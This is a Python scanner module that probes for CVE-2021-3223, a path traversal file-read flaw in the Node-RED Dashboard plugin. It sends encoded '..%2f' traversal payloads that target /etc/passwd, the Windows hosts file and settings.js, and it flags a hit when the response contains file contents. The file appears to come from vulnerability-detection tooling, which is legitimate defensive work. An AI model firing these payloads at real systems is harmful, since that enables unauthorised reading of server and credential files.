#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool import check

cve_2021_3223_payloads = [
    {'path': 'ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'},
    {'path': 'ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fC:%2fWindows%2fSystem32%2fdrivers%2fetc%2fhosts'},
    {'path': 'ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fC:%5cWindows%5cSystem32%5cdrivers%5cetc%5chosts'},
    {'path': 'ui_base/js/..%2f..%2f..%2f..%2fsettings.js'},
    {'path': 'js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'},
    {'path': 'js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fC:%2fWindows%2fSystem32%2fdrivers%2fetc%2fhosts'},
    {'path': 'js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fC:%5cWindows%5cSystem32%5cdrivers%5cetc%5chosts'},
    {'path': 'js/..%2f..%2f..%2f..%2fsettings.js'},
]

def cve_2021_3223_scan(clients):
    ''' Node-RED由于未对url中传输的路径进行严格过滤, 导致攻击者可构造特殊路径进行任意文件读取
            Node-Red-Dashboard version < 2.26.2
            (Node-Red插件Node-Red-Dashboard, 如果未安装此插件, 或插件版本高于2.26.2, 则不受影响)
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': 'Node-RED',
        'vul_type': 'File-Read',
        'vul_id': 'CVE-2021-3223',
    }

    for payload in cve_2021_3223_payloads:
        path = payload['path']

        res = client.request(
            'get',
            path,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (check.check_res_fileread(res.text)
            or ('To password protect the Node-RED editor and admin API' in res.text)
        ):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
